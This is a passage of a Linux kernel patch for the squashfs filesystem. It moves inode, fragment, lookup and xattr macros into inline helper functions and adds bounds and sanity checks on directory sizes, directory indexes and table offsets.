+				&soffset, sizeof(*sqshb_ino));
 	if (err < 0)
 		goto failed_read;
 
@@ -128,9 +133,6 @@ int squashfs_read_inode(struct inode *in
 	if (err)
 		goto failed_read;
 
-	block = SQUASHFS_INODE_BLK(ino) + msblk->inode_table;
-	offset = SQUASHFS_INODE_OFFSET(ino);
-
 	type = le16_to_cpu(sqshb_ino->inode_type);
 	switch (type) {
 	case SQUASHFS_REG_TYPE: {
@@ -156,11 +158,9 @@ int squashfs_read_inode(struct inode *in
 				goto failed_read;
 			}
 			frag_offset = le32_to_cpu(sqsh_ino->offset);
-			frag_size = squashfs_frag_lookup(sb, frag, &frag_blk);
-			if (frag_size < 0) {
-				err = frag_size;
+			err = squashfs_frag_lookup(sb, frag, &frag_blk, &frag_size);
+			if (err < 0)
 				goto failed_read;
-			}
 		} else {
 			frag_blk = SQUASHFS_INVALID_BLK;
 			frag_size = 0;
@@ -181,8 +181,9 @@ int squashfs_read_inode(struct inode *in
 		inode->i_data.a_ops = &squashfs_aops;
 
 		TRACE("File inode %x:%x, start_block %llx, block_list_start "
-			"%llx, offset %x\n", SQUASHFS_INODE_BLK(ino),
-			offset, squashfs_i(inode)->start, block, offset);
+			"%llx, offset %x\n", squashfs_inode_blk(ino),
+			squashfs_inode_offset(ino),
+			squashfs_i(inode)->start, block, offset);
 		break;
 	}
 	case SQUASHFS_LREG_TYPE: {
@@ -212,11 +213,9 @@ int squashfs_read_inode(struct inode *in
 				goto failed_read;
 			}
 			frag_offset = le32_to_cpu(sqsh_ino->offset);
-			frag_size = squashfs_frag_lookup(sb, frag, &frag_blk);
-			if (frag_size < 0) {
-				err = frag_size;
+			err = squashfs_frag_lookup(sb, frag, &frag_blk, &frag_size);
+			if (err < 0)
 				goto failed_read;
-			}
 		} else {
 			frag_blk = SQUASHFS_INVALID_BLK;
 			frag_size = 0;
@@ -241,8 +240,9 @@ int squashfs_read_inode(struct inode *in
 		inode->i_data.a_ops = &squashfs_aops;
 
 		TRACE("File inode %x:%x, start_block %llx, block_list_start "
-			"%llx, offset %x\n", SQUASHFS_INODE_BLK(ino),
-			offset, squashfs_i(inode)->start, block, offset);
+			"%llx, offset %x\n", squashfs_inode_blk(ino),
+			squashfs_inode_offset(ino), squashfs_i(inode)->start,
+			block, offset);
 		break;
 	}
 	case SQUASHFS_DIR_TYPE: {
@@ -253,8 +253,14 @@ int squashfs_read_inode(struct inode *in
 		if (err < 0)
 			goto failed_read;
 
-		set_nlink(inode, le32_to_cpu(sqsh_ino->nlink));
+		/* The directory size must be 3 or larger, as it includes "." and ".." entries */
 		inode->i_size = le16_to_cpu(sqsh_ino->file_size);
+		if (inode->i_size < 3) {
+			err = -EINVAL;
+			goto failed_read;
+		}
+
+		set_nlink(inode, le32_to_cpu(sqsh_ino->nlink));
 		inode->i_op = &squashfs_dir_inode_ops;
 		inode->i_fop = &squashfs_dir_ops;
 		inode->i_mode |= S_IFDIR;
@@ -264,7 +270,8 @@ int squashfs_read_inode(struct inode *in
 		squashfs_i(inode)->parent = le32_to_cpu(sqsh_ino->parent_inode);
 
 		TRACE("Directory inode %x:%x, start_block %llx, offset %x\n",
-				SQUASHFS_INODE_BLK(ino), offset,
+				squashfs_inode_blk(ino),
+				squashfs_inode_offset(ino),
 				squashfs_i(inode)->start,
 				le16_to_cpu(sqsh_ino->offset));
 		break;
@@ -277,9 +284,15 @@ int squashfs_read_inode(struct inode *in
 		if (err < 0)
 			goto failed_read;
 
+		/* The directory size must be 3 or larger, as it includes "." and ".." entries */
+		inode->i_size = le32_to_cpu(sqsh_ino->file_size);
+		if (inode->i_size < 3) {
+			err = -EINVAL;
+			goto failed_read;
+		}
+
 		xattr_id = le32_to_cpu(sqsh_ino->xattr);
 		set_nlink(inode, le32_to_cpu(sqsh_ino->nlink));
-		inode->i_size = le32_to_cpu(sqsh_ino->file_size);
 		inode->i_op = &squashfs_dir_inode_ops;
 		inode->i_fop = &squashfs_dir_ops;
 		inode->i_mode |= S_IFDIR;
@@ -291,7 +304,8 @@ int squashfs_read_inode(struct inode *in
 		squashfs_i(inode)->parent = le32_to_cpu(sqsh_ino->parent_inode);
 
 		TRACE("Long directory inode %x:%x, start_block %llx, offset "
-				"%x\n", SQUASHFS_INODE_BLK(ino), offset,
+				"%x\n", squashfs_inode_blk(ino),
+				squashfs_inode_offset(ino),
 				squashfs_i(inode)->start,
 				le16_to_cpu(sqsh_ino->offset));
 		break;
@@ -335,8 +349,8 @@ int squashfs_read_inode(struct inode *in
 		}
 
 		TRACE("Symbolic link inode %x:%x, start_block %llx, offset "
-				"%x\n", SQUASHFS_INODE_BLK(ino), offset,
-				block, offset);
+				"%x\n", squashfs_inode_blk(ino),
+				squashfs_inode_offset(ino), block, offset);
 		break;
 	}
 	case SQUASHFS_BLKDEV_TYPE:
@@ -359,7 +373,8 @@ int squashfs_read_inode(struct inode *in
 		squashfs_i(inode)->parent = 0;
 
 		TRACE("Device inode %x:%x, rdev %x\n",
-				SQUASHFS_INODE_BLK(ino), offset, rdev);
+				squashfs_inode_blk(ino),
+				squashfs_inode_offset(ino), rdev);
 		break;
 	}
 	case SQUASHFS_LBLKDEV_TYPE:
@@ -384,7 +399,8 @@ int squashfs_read_inode(struct inode *in
 		squashfs_i(inode)->parent = 0;
 
 		TRACE("Device inode %x:%x, rdev %x\n",
-				SQUASHFS_INODE_BLK(ino), offset, rdev);
+				squashfs_inode_blk(ino),
+				squashfs_inode_offset(ino), rdev);
 		break;
 	}
 	case SQUASHFS_FIFO_TYPE:
@@ -430,7 +446,7 @@ int squashfs_read_inode(struct inode *in
 		return -EINVAL;
 	}
 
-	if (xattr_id != SQUASHFS_INVALID_XATTR && msblk->xattr_id_table) {
+	if (xattr_id != SQUASHFS_INVALID_XATTR && msblk->xattr_id_array) {
 		err = squashfs_xattr_lookup(sb, xattr_id,
 					&squashfs_i(inode)->xattr_count,
 					&squashfs_i(inode)->xattr_size,
@@ -440,10 +456,13 @@ int squashfs_read_inode(struct inode *in
 		inode->i_blocks += ((squashfs_i(inode)->xattr_size - 1) >> 9)
 				+ 1;
 	} else
-		squashfs_i(inode)->xattr_count = 0;
+		squashfs_i(inode)->xattr = SQUASHFS_INVALID_BLK;
 
 	return 0;
 
+bad_block_val:
+	err = block;
+
 failed_read:
 	ERROR("Unable to read inode 0x%llx\n", ino);
 	return err;
--- a/fs/squashfs/namei.c~a
+++ a/fs/squashfs/namei.c
@@ -49,6 +49,7 @@
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
 #include "squashfs_fs_i.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 #include "xattr.h"
 
@@ -60,52 +61,97 @@
  * (if any) we have managed to read - the index isn't essential, just
  * quicker.
  */
-static int get_dir_index_using_name(struct super_block *sb,
+static unsigned int get_dir_index_using_name(struct super_block *sb,
 			u64 *next_block, int *next_offset, u64 index_start,
-			int index_offset, int i_count, const char *name)
+			int index_offset, unsigned int i_count,
+			loff_t max_index, const char *name)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	int i, length = 0, err;
-	unsigned int size;
-	struct squashfs_dir_index *index;
+	s64 res;
+	int err;
+	unsigned int i, index, length = 0, size, start_block, block;
+	struct squashfs_dir_index *dir_index;
 
-	TRACE("Entered get_dir_index_using_name, i_count %d\n", i_count);
+	TRACE("Entered get_dir_index_using_name, i_count %u\n", i_count);
 
-	index = kmalloc(sizeof(*index) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
-	if (index == NULL) {
+	if (i_count == 0)
+		goto out;
+
+	/*
+	 * Translate from external index to internal index.  This is offset by
+	 * 3 because we invent "." and ".." entries.
+	 */
+	max_index -= 3;
+
+	/*
+	 * A valid index starts at a directory header, and there must be enough
+	 * room for a directory header and one directory entry.
+	 */
+	if (max_index < sizeof(struct squashfs_dir_header) +
+				sizeof(struct squashfs_dir_entry) + 1)
+		goto out;
+
+	max_index -= sizeof(struct squashfs_dir_header) +
+				sizeof(struct squashfs_dir_entry) + 1;
+
+	dir_index = kmalloc(sizeof(*dir_index) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
+	if (dir_index == NULL) {
 		ERROR("Failed to allocate squashfs_dir_index\n");
 		goto out;
 	}
 
 	for (i = 0; i < i_count; i++) {
-		err = squashfs_read_metadata(sb, index, &index_start,
-					&index_offset, sizeof(*index));
+		err = squashfs_read_metadata(sb, dir_index, &index_start,
+					&index_offset, sizeof(*dir_index));
 		if (err < 0)
 			break;
 
+		/* Sanity check the directory index contents */
 
-		size = le32_to_cpu(index->size) + 1;
+		/* size should never be larger than SQUASHFS_NAME_LEN */
+		size = le32_to_cpu(dir_index->size) + 1;
 		if (size > SQUASHFS_NAME_LEN)
 			break;
 
-		err = squashfs_read_metadata(sb, index->name, &index_start,
+		/* The stored index should not be larger than max_index */
+		index = le32_to_cpu(dir_index->index);
+		if (index > max_index)
+			break;
+
+		block = le32_to_cpu(dir_index->start_block);
+
+		if (i > 0) {
+			/* The stored index should be larger than the previous index */
+			if (index <= length)
+				break;
+
+			/* The start_block should not be less than the previous start_block */
+			if (block < start_block)
+				break;
+		}
+
+		err = squashfs_read_metadata(sb, dir_index->name, &index_start,
 					&index_offset, size);
 		if (err < 0)
 			break;
 
-		index->name[size] = '\0';
+		dir_index->name[size] = '\0';
 
-		if (strcmp(index->name, name) > 0)
+		if (strcmp(dir_index->name, name) > 0)
+			/* Found the index we're looking for. */
 			break;
 
-		length = le32_to_cpu(index->index);
-		*next_block = le32_to_cpu(index->start_block) +
-					msblk->directory_table;
-	}
+		res = squashfs_dir_start(block, msblk);
+		if (res < 0)
+			break;
 
-	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
-	kfree(index);
+		start_block = block;
+		length = index;
+		*next_block = res;
+	}
 
+	*next_offset = ((u64)length + *next_offset) % SQUASHFS_METADATA_SIZE;
+	kfree(dir_index);
 out:
 	/*
 	 * Return index (f_pos) of the looked up metadata block.  Translate
@@ -125,13 +171,25 @@ static struct dentry *squashfs_lookup(st
 	struct inode *inode = NULL;
 	struct squashfs_sb_info *msblk = dir->i_sb->s_fs_info;
 	struct squashfs_dir_header dirh;
-	struct squashfs_dir_entry *dire;
-	u64 block = squashfs_i(dir)->start + msblk->directory_table;
-	int offset = squashfs_i(dir)->offset;
-	int err, length;
+	struct squashfs_dir_entry *dire = NULL;
+	s64 block;
+	int offset, err;
+	loff_t length;
 	unsigned int dir_count, size;
 
-	TRACE("Entered squashfs_lookup [%llx:%x]\n", block, offset);
+	TRACE("Entered squashfs_lookup [%llx:%x]\n", squashfs_i(dir)->start,
+			squashfs_i(dir)->offset);
+
+	if (len > SQUASHFS_NAME_LEN)
+		return ERR_PTR(-ENAMETOOLONG);
+
+	if (i_size_read(dir) == 3)
+		/* The directory is empty, and so there's nothing to do */
+		goto exit_lookup;
+
+	block = squashfs_dir_start(squashfs_i(dir)->start, msblk);
+	if (block < 0)
+		goto data_error;
 
 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
 	if (dire == NULL) {
@@ -139,20 +197,20 @@ static struct dentry *squashfs_lookup(st
 		return ERR_PTR(-ENOMEM);
 	}
 
-	if (len > SQUASHFS_NAME_LEN) {
-		err = -ENAMETOOLONG;
-		goto failed;
-	}
-
+	offset = squashfs_i(dir)->offset;
 	length = get_dir_index_using_name(dir->i_sb, &block, &offset,
 				squashfs_i(dir)->dir_idx_start,
 				squashfs_i(dir)->dir_idx_offset,
-				squashfs_i(dir)->dir_idx_cnt, name);
+				squashfs_i(dir)->dir_idx_cnt,
+				i_size_read(dir), name);
 
 	while (length < i_size_read(dir)) {
 		/*
 		 * Read directory header.
 		 */
+		if (!squashfs_dir_space(dir, length, sizeof(dirh)))
+			goto data_error;
+
 		err = squashfs_read_metadata(dir->i_sb, &dirh, &block,
 				&offset, sizeof(dirh));
 		if (err < 0)
@@ -169,23 +227,30 @@ static struct dentry *squashfs_lookup(st
 			/*
 			 * Read directory entry.
 			 */
+			if (!squashfs_dir_space(dir, length, sizeof(*dire)))
+				goto data_error;
+
 			err = squashfs_read_metadata(dir->i_sb, dire, &block,
 					&offset, sizeof(*dire));
 			if (err < 0)
 				goto read_failure;
 
+			length += sizeof(*dire);
 			size = le16_to_cpu(dire->size) + 1;
 
 			/* size should never be larger than SQUASHFS_NAME_LEN */
 			if (size > SQUASHFS_NAME_LEN)
 				goto data_error;
 
+			if (!squashfs_dir_space(dir, length, size))
+				goto data_error;
+
 			err = squashfs_read_metadata(dir->i_sb, dire->name,
 					&block, &offset, size);
 			if (err < 0)
 				goto read_failure;
 
-			length += sizeof(*dire) + size;
+			length += size;
 
 			if (name[0] < dire->name[0])
 				goto exit_lookup;
@@ -197,7 +262,7 @@ static struct dentry *squashfs_lookup(st
 				off = le16_to_cpu(dire->offset);
 				ino_num = le32_to_cpu(dirh.inode_number) +
 					(short) le16_to_cpu(dire->inode_number);
-				ino = SQUASHFS_MKINODE(blk, off);
+				ino = squashfs_mkinode(blk, off);
 
 				TRACE("calling squashfs_iget for directory "
 					"entry %s, inode  %x:%x, %d\n", name,
@@ -217,10 +282,8 @@ data_error:
 	err = -EIO;
 
 read_failure:
-	ERROR("Unable to read directory block [%llx:%x]\n",
-		squashfs_i(dir)->start + msblk->directory_table,
-		squashfs_i(dir)->offset);
-failed:
+	ERROR("Unable to read directory [%llx:%x]\n", squashfs_i(dir)->start,
+			squashfs_i(dir)->offset);
 	kfree(dire);
 	return ERR_PTR(err);
 }
--- a/fs/squashfs/squashfs_fs.h~a
+++ a/fs/squashfs/squashfs_fs.h
@@ -101,106 +101,6 @@
 #define SQUASHFS_XATTR_VALUE_OOL        256
 #define SQUASHFS_XATTR_PREFIX_MASK      0xff
 
-/* Flag whether block is compressed or uncompressed, bit is set if block is
- * uncompressed */
-#define SQUASHFS_COMPRESSED_BIT		(1 << 15)
-
-#define SQUASHFS_COMPRESSED_SIZE(B)	(((B) & ~SQUASHFS_COMPRESSED_BIT) ? \
-		(B) & ~SQUASHFS_COMPRESSED_BIT :  SQUASHFS_COMPRESSED_BIT)
-
-#define SQUASHFS_COMPRESSED(B)		(!((B) & SQUASHFS_COMPRESSED_BIT))
-
-#define SQUASHFS_COMPRESSED_BIT_BLOCK	(1 << 24)
-
-#define SQUASHFS_COMPRESSED_SIZE_BLOCK(B)	((B) & \
-						~SQUASHFS_COMPRESSED_BIT_BLOCK)
-
-#define SQUASHFS_COMPRESSED_BLOCK(B)	(!((B) & SQUASHFS_COMPRESSED_BIT_BLOCK))
-
-static inline int squashfs_block_size(__le32 raw)
-{
-	u32 size = le32_to_cpu(raw);
-	return (size >> 25) ? -EIO : size;
-}
-
-/*
- * Inode number ops.  Inodes consist of a compressed block number, and an
- * uncompressed offset within that block
- */
-#define SQUASHFS_INODE_BLK(A)		((unsigned int) ((A) >> 16))
-
-#define SQUASHFS_INODE_OFFSET(A)	((unsigned int) ((A) & 0xffff))
-
-#define SQUASHFS_MKINODE(A, B)		((long long)(((long long) (A)\
-					<< 16) + (B)))
-
-/* fragment and fragment table defines */
-#define SQUASHFS_FRAGMENT_BYTES(A)	\
-				((A) * sizeof(struct squashfs_fragment_entry))
-
-#define SQUASHFS_FRAGMENT_INDEX(A)	(SQUASHFS_FRAGMENT_BYTES(A) / \
-					SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_FRAGMENT_INDEX_OFFSET(A)	(SQUASHFS_FRAGMENT_BYTES(A) % \
-						SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_FRAGMENT_INDEXES(A)	((SQUASHFS_FRAGMENT_BYTES(A) + \
-					SQUASHFS_METADATA_SIZE - 1) / \
-					SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_FRAGMENT_INDEX_BYTES(A)	(SQUASHFS_FRAGMENT_INDEXES(A) *\
-						sizeof(u64))
-
-/* inode lookup table defines */
-#define SQUASHFS_LOOKUP_BYTES(A)	((A) * sizeof(u64))
-
-#define SQUASHFS_LOOKUP_BLOCK(A)	(SQUASHFS_LOOKUP_BYTES(A) / \
-					SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_LOOKUP_BLOCK_OFFSET(A)	(SQUASHFS_LOOKUP_BYTES(A) % \
-					SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_LOOKUP_BLOCKS(A)	((SQUASHFS_LOOKUP_BYTES(A) + \
-					SQUASHFS_METADATA_SIZE - 1) / \
-					SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_LOOKUP_BLOCK_BYTES(A)	(SQUASHFS_LOOKUP_BLOCKS(A) *\
-					sizeof(u64))
-
-/* uid/gid lookup table defines */
-#define SQUASHFS_ID_BYTES(A)		((A) * sizeof(unsigned int))
-
-#define SQUASHFS_ID_BLOCK(A)		(SQUASHFS_ID_BYTES(A) / \
-					SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_ID_BLOCK_OFFSET(A)	(SQUASHFS_ID_BYTES(A) % \
-					SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_ID_BLOCKS(A)		((SQUASHFS_ID_BYTES(A) + \
-					SQUASHFS_METADATA_SIZE - 1) / \
-					SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_ID_BLOCK_BYTES(A)	(SQUASHFS_ID_BLOCKS(A) *\
-					sizeof(u64))
-/* xattr id lookup table defines */
-#define SQUASHFS_XATTR_BYTES(A)		(((u64) (A)) * sizeof(struct squashfs_xattr_id))
-
-#define SQUASHFS_XATTR_BLOCK(A)		(SQUASHFS_XATTR_BYTES(A) / \
-					SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_XATTR_BLOCK_OFFSET(A)	(SQUASHFS_XATTR_BYTES(A) % \
-					SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_XATTR_BLOCKS(A)	((SQUASHFS_XATTR_BYTES(A) + \
-					SQUASHFS_METADATA_SIZE - 1) / \
-					SQUASHFS_METADATA_SIZE)
-
-#define SQUASHFS_XATTR_BLOCK_BYTES(A)	(SQUASHFS_XATTR_BLOCKS(A) *\
-					sizeof(u64))
-#define SQUASHFS_XATTR_BLK(A)		((unsigned int) ((A) >> 16))
-
-#define SQUASHFS_XATTR_OFFSET(A)	((unsigned int) ((A) & 0xffff))
-
 /* cached data constants for filesystem */
 #define SQUASHFS_CACHED_BLKS		8
 
@@ -449,5 +349,4 @@ struct squashfs_xattr_id_table {
 	__le32			xattr_ids;
 	__le32			unused;
 };
-
 #endif
--- a/fs/squashfs/squashfs_fs_i.h~a
+++ a/fs/squashfs/squashfs_fs_i.h
@@ -15,7 +15,7 @@ struct squashfs_inode_info {
 	int		offset;
 	u64		xattr;
 	unsigned int	xattr_size;
-	int		xattr_count;
+	unsigned int	xattr_count;
 	int		parent;
 	union {
 		struct {
--- a/fs/squashfs/squashfs_fs_sb.h~a
+++ a/fs/squashfs/squashfs_fs_sb.h
@@ -59,15 +59,31 @@ struct squashfs_sb_info {
 	struct address_space			*cache_mapping;
 	int					next_meta_index;
 	__le64					*id_table;
-	__le64					*fragment_index;
-	__le64					*xattr_id_table;
+	union {
+		__le64				*fragment_index_array;
+		struct squashfs_cache		*fragment_index_cache;
+	};
+	union {
+		__le64				*xattr_id_array;
+		struct squashfs_cache		*xattr_id_cache;
+	};
 	struct mutex				meta_index_mutex;
 	struct meta_index			*meta_index;
 	void					*stream;
-	__le64					*inode_lookup_table;
+	union {
+		__le64				*inode_lookup_array;
+		struct squashfs_cache		*inode_lookup_cache;
+	};
 	u64					inode_table;
 	u64					directory_table;
+	u64					directory_table_end;
+	u64					fragment_table;
+	u64					fragment_table_start;
 	u64					xattr_table;
+	u64					lookup_table;
+	u64					lookup_table_start;
+	u64					xattr_id_table;
+	u64					xattr_id_table_start;
 	unsigned int				block_size;
 	unsigned short				block_log;
 	long long				bytes_used;
@@ -78,5 +94,8 @@ struct squashfs_sb_info {
 	bool					panic_on_errors;
 	const struct squashfs_decompressor_thread_ops *thread_ops;
 	int					max_thread_num;
+	bool					lookup_table_is_cache;
+	bool					fragment_index_is_cache;
+	bool					xattr_id_is_cache;
 };
 #endif
--- a/fs/squashfs/squashfs.h~a
+++ a/fs/squashfs/squashfs.h
@@ -64,13 +64,16 @@ extern const struct squashfs_decompresso
 #endif
 
 /* export.c */
-extern __le64 *squashfs_read_inode_lookup_table(struct super_block *, u64, u64,
+extern int squashfs_read_inode_lookup_table(struct super_block *, u64, u64,
 				unsigned int);
+extern s64 squashfs_inode_lookup_start(struct super_block *sb, u32 ino_num);
 
 /* fragment.c */
-extern int squashfs_frag_lookup(struct super_block *, unsigned int, u64 *);
-extern __le64 *squashfs_read_fragment_index_table(struct super_block *,
+extern int squashfs_frag_lookup(struct super_block *sb, unsigned int fragment,
+				u64 *fragment_block, int *fragment_size);
+extern int squashfs_read_fragment_index_table(struct super_block *,
 				u64, u64, unsigned int);
+extern s64 squashfs_frag_lookup_start(struct super_block *sb, u32 fragment);
 
 /* file.c */
 void squashfs_copy_cache(struct folio *, struct squashfs_cache_entry *,
diff --git a/fs/squashfs/squashfs_helpers.h a/fs/squashfs/squashfs_helpers.h
new file mode 100644
--- /dev/null
+++ a/fs/squashfs/squashfs_helpers.h
@@ -0,0 +1,362 @@
+/* SPDX-License-Identifier: GPL-2.0-only */
+#ifndef SQUASHFS_HELPERS_H
+#define SQUASHFS_HELPERS_H
+/*
+ * Copyright (c) 2026
+ * Phillip Lougher <phillip@squashfs.org.uk>
+ */
+
+/* Flag whether block is compressed or uncompressed, bit is set if block is
+ * uncompressed
+ */
+#define SQUASHFS_COMPRESSED_BIT		(1 << 15)
+
+static inline s16 squashfs_compressed_size(s16 size)
+{
+	return size & ~SQUASHFS_COMPRESSED_BIT;
+}
+
+static inline bool squashfs_compressed(s16 size)
+{
+	return (size & SQUASHFS_COMPRESSED_BIT) == 0;
+}
+
+#define SQUASHFS_COMPRESSED_BIT_BLOCK		(1 << 24)
+
+static inline s32 squashfs_compressed_size_block(s32 size)
+{
+	return size & ~SQUASHFS_COMPRESSED_BIT_BLOCK;
+}
+
+static inline bool squashfs_compressed_block(s32 size)
+{
+	return (size & SQUASHFS_COMPRESSED_BIT_BLOCK) == 0;
+}
+
+/*
+ * Inode number ops.  Inodes consist of a compressed block number, and an
+ * uncompressed  offset within that block
+ */
+static inline u32 squashfs_inode_blk(s64 inode)
+{
+	return inode >> 16;
+}
+
+static inline u16 squashfs_inode_offset(s64 inode)
+{
+	return inode & 0xffff;
+}
+
+static inline s64 squashfs_inode_start(struct squashfs_sb_info *msblk, s64 inode)
+{
+	s64 start;
+
+	if (inode < 0)
+		return -EINVAL;
+
+	if (S64_MAX - msblk->inode_table < squashfs_inode_blk(inode))
+		return -EINVAL;
+
+	start = msblk->inode_table + squashfs_inode_blk(inode);
+
+	if (start >= msblk->directory_table)
+		return -EINVAL;
+
+	return start;
+}
+
+static inline s64 squashfs_mkinode(u32 start, u16 offset)
+{
+	return ((s64)start << 16) | offset;
+}
+
+/* directory helper functions */
+static inline s64 squashfs_dir_start(u32 blk, struct squashfs_sb_info *msblk)
+{
+	s64 start;
+
+	if (S64_MAX - msblk->directory_table < blk)
+		return -EINVAL;
+
+	start = msblk->directory_table + blk;
+
+	if (start >= msblk->directory_table_end)
+		return -EINVAL;
+
+	return start;
+}
+
+/* fragment and fragment table defines */
+static inline s64 squashfs_fragment_bytes(u32 fragments)
+{
+	return (s64) fragments * sizeof(struct squashfs_fragment_entry);
+}
+
+static inline s32 squashfs_fragment_index(u32 fragments)
+{
+	return squashfs_fragment_bytes(fragments) / SQUASHFS_METADATA_SIZE;
+}
+
+static inline s16 squashfs_fragment_index_offset(u32 fragments)
+{
+	return squashfs_fragment_bytes(fragments) % SQUASHFS_METADATA_SIZE;
+}
+
+static inline s32 squashfs_fragment_indexes(u32 fragments)
+{
+	return (squashfs_fragment_bytes(fragments) + (SQUASHFS_METADATA_SIZE - 1)) /
+		SQUASHFS_METADATA_SIZE;
+}
+
+static inline s32 squashfs_fragment_indexes_bytes(u32 fragments)
+{
+	return squashfs_fragment_indexes(fragments) * sizeof(long long);
+}
+
+static inline s32 squashfs_fragment_indexes_base(u32 fragments)
+{
+	return (squashfs_fragment_index(fragments) * sizeof(long long)) & ~(PAGE_SIZE - 1);
+}
+
+static inline s64 squashfs_fragment_indexes_start(u32 fragments, struct squashfs_sb_info *msblk)
+{
+	s32 base = squashfs_fragment_indexes_base(fragments);
+	s64 start;
+
+	if (S64_MAX - msblk->fragment_table < base)
+		return -EINVAL;
+
+	start = msblk->fragment_table + base;
+
+	if (start > msblk->bytes_used)
+		return -EINVAL;
+
+	return start;
+}
+
+static inline s32 squashfs_fragment_indexes_offset(u32 fragments)
+{
+	return (squashfs_fragment_index(fragments) * sizeof(long long)) & (PAGE_SIZE - 1);
+}
+
+/* inode lookup table defines */
+static inline s64 squashfs_lookup_bytes(u32 inodes)
+{
+	return (s64) inodes * sizeof(s64);
+}
+
+static inline s32 squashfs_lookup_block(u32 inodes)
+{
+	return squashfs_lookup_bytes(inodes) / SQUASHFS_METADATA_SIZE;
+}
+
+static inline s16 squashfs_lookup_block_offset(u32 inodes)
+{
+	return squashfs_lookup_bytes(inodes) % SQUASHFS_METADATA_SIZE;
+}
+
+static inline s32 squashfs_lookup_blocks(u32 inodes)
+{
+	return (squashfs_lookup_bytes(inodes) + (SQUASHFS_METADATA_SIZE - 1)) /
+		SQUASHFS_METADATA_SIZE;
+}
+
+static inline s32 squashfs_lookup_blocks_bytes(u32 inodes)
+{
+	return squashfs_lookup_blocks(inodes) * sizeof(long long);
+}
+
+static inline s32 squashfs_lookup_blocks_base(u32 inodes)
+{
+	return (squashfs_lookup_block(inodes) * sizeof(long long)) & ~(PAGE_SIZE - 1);
+}
+
+static inline s64 squashfs_lookup_blocks_start(u32 inodes, struct squashfs_sb_info *msblk)
+{
+	s32 base = squashfs_lookup_blocks_base(inodes);
+	s64 start;
+
+	if (S64_MAX - msblk->lookup_table < base)
+		return -EINVAL;
+
+	start = msblk->lookup_table + base;
+
+	if (start > msblk->bytes_used)
+		return -EINVAL;
+
+	return start;
+}
+
+static inline s32 squashfs_lookup_blocks_offset(u32 inodes)
+{
+	return (squashfs_lookup_block(inodes) * sizeof(long long)) & (PAGE_SIZE - 1);
+}
+
+/* uid lookup table defines */
+static inline s32 squashfs_id_bytes(u16 ids)
+{
+	return (s32) ids * sizeof(unsigned int);
+}
+
+static inline s32 squashfs_id_block(u16 ids)
+{
+	return squashfs_id_bytes(ids) / SQUASHFS_METADATA_SIZE;
+}
+
+static inline s16 squashfs_id_block_offset(u16 ids)
+{
+	return squashfs_id_bytes(ids) % SQUASHFS_METADATA_SIZE;
+}
+
+static inline s8 squashfs_id_blocks(u16 ids)
+{
+	return (squashfs_id_bytes(ids) + (SQUASHFS_METADATA_SIZE - 1)) /
+		SQUASHFS_METADATA_SIZE;
+}
+
+static inline s16 squashfs_id_block_bytes(u16 ids)
+{
+	return squashfs_id_blocks(ids) * sizeof(long long);
+}
+
+/* xattr id lookup table defines */
+static inline s64 squashfs_xattr_bytes(u32 xattrs)
+{
+	return (s64) xattrs * sizeof(struct squashfs_xattr_id);
+}
+
+static inline s32 squashfs_xattr_block(u32 xattrs)
+{
+	return squashfs_xattr_bytes(xattrs) / SQUASHFS_METADATA_SIZE;
+}
+
+static inline s16 squashfs_xattr_block_offset(u32 xattrs)
+{
+	return squashfs_xattr_bytes(xattrs) % SQUASHFS_METADATA_SIZE;
+}
+
+static inline s32 squashfs_xattr_blocks(u32 xattrs)
+{
+	return (squashfs_xattr_bytes(xattrs) + SQUASHFS_METADATA_SIZE - 1) /
+		SQUASHFS_METADATA_SIZE;
+}
+
+static inline s32 squashfs_xattr_blocks_bytes(u32 xattrs)
+{
+	return squashfs_xattr_blocks(xattrs) * sizeof(long long);
+}
+
+static inline s32 squashfs_xattr_blocks_base(u32 xattrs)
+{
+	return (squashfs_xattr_block(xattrs) * sizeof(long long)) & ~(PAGE_SIZE - 1);
+}
+
+static inline s64 squashfs_xattr_blocks_start(u32 xattrs, struct squashfs_sb_info *msblk)
+{
+	s32 base = squashfs_xattr_blocks_base(xattrs);
+	s64 table_start = msblk->xattr_id_table + sizeof(struct squashfs_xattr_id_table);
+	s64 start;
+
+	if (S64_MAX - table_start < base)
+		return -EINVAL;
+
+	start = table_start + base;
+
+	if (start > msblk->bytes_used)
+		return -EINVAL;
+
+	return start;
+}
+
+static inline s32 squashfs_xattr_blocks_offset(u32 xattrs)
+{
+	return (squashfs_xattr_block(xattrs) * sizeof(long long)) & (PAGE_SIZE - 1);
+}
+
+static inline u32 squashfs_xattr_blk(s64 xattr)
+{
+	return xattr >> 16;
+}
+
+static inline s16 squashfs_xattr_offset(s64 xattr)
+{
+	return xattr & 0xffff;
+}
+
+static inline int squashfs_block_size(u32 size, s32 block_size)
+{
+	/* reject any size with bits set where they should not be */
+	if ((size & ~SQUASHFS_COMPRESSED_BIT_BLOCK) > block_size)
+		return -EIO;
+
+	/* a block can't be both full size and compressed */
+	if (size == block_size)
+		return -EIO;
+
+	/* a zero size block will never have SQUASHFS_COMPRESSED_BIT_BLOCK set */
+	if (size == SQUASHFS_COMPRESSED_BIT_BLOCK)
+		return -EIO;
+
+	return size;
+}
+
+static inline int squashfs_data_size(__le32 raw, s32 block_size)
+{
+	return squashfs_block_size(le32_to_cpu(raw), block_size);
+}
+
+static inline int squashfs_frag_size(u32 disk_size, s32 block_size)
+{
+	int size = squashfs_block_size(disk_size, block_size);
+
+	if (size < 0)
+		return size;
+
+	/* a fragment block can't be zero size */
+	if (size == 0)
+		return -EIO;
+
+	return size;
+}
+
